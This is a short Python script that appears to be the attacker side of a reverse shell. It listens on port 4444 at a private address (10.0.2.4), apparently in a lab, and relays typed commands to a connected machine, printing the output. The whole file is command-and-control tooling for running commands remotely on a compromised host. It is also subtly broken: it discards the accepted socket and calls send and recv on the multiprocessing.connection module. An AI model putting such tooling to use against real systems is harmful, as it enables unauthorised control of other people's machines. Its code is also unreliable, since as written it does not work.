import socket
from multiprocessing import connection

listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
listener.bind(("10.0.2.4", 4444))
listener.listen(0)
print("Waiting for incoming connections")
listener.accept()
print("Got a connection")

while True:
    command = input(">> ")
    connection.send(command)
    result = connection.recv(1024)
    print(result)